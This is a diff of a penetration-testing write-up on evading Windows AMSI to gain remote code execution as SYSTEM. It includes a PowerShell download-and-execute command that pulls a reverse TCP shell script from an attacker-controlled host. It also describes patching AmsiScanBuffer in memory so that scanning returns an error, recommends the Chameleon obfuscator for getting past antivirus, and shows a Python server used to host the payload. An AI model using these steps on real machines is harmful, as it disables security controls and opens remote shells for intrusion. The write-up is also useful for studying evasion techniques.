@@ -8,14 +8,14 @@
 
 ## Outline
 
-The goal of this write-up is to demonstrate bypassing the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28) and gain a Remote Code Execution (RCE).
+The goal of this write-up is to demonstrate bypassing the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28). The objective was to gain a Remote Code Execution (RCE) as NT/Authority System.
 
 ![](/assets/AV/diagram.png)  
 
 AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime
 
 By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware. This ultimately prevents arbitrary execution of code.
-# AMSI Bypass Techniques
+# AMSI Evasion
 The following evasive techniques aim to avoid detection by antivirus and security software.  
 
 ##### Code Fragmentation: 
@@ -34,7 +34,7 @@ Downgrade to Windows PowerShell 2.0. It lacks essential security controls like A
 
 ![](/assets/AV/Final.gif)  
 
-To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command.
+To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command in memory.
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
@@ -81,12 +81,18 @@ $p = 0
 [System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
 ```
 
-By patching the `AmsiScanBuffer` function in AMSI.dll with specific assembly code (mov eax, 0x80070057 and ret), the function will immediately return an error code without scanning PowerShell code. This bypasses AMSI, allowing the attacker's PowerShell code to run undetected. However, it is worth noting that without implementing proper obfuscation methodologies, even the above payload would be flagged as malicious by AMSI. Thus to obfuscate the content and intention of the payload, the tester made of Chameleon Powershell Obfuscator. 
 
+By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code, effectively avoiding the scanning of PowerShell code. This method allows the attacker's PowerShell code to execute without triggering AMSI's detection.
 
+However, it is essential to acknowledge that even with the aforementioned payload, AMSI might still identify the content as malicious unless proper obfuscation methodologies are implemented. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
+string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
+After proper obfuscation techniques were in place, the tester hosted a python web server on port 8443.
+```bash
+python3 -m http.server 8443
+```
 
-
+amsi area.
 
 ## Weaponization
 
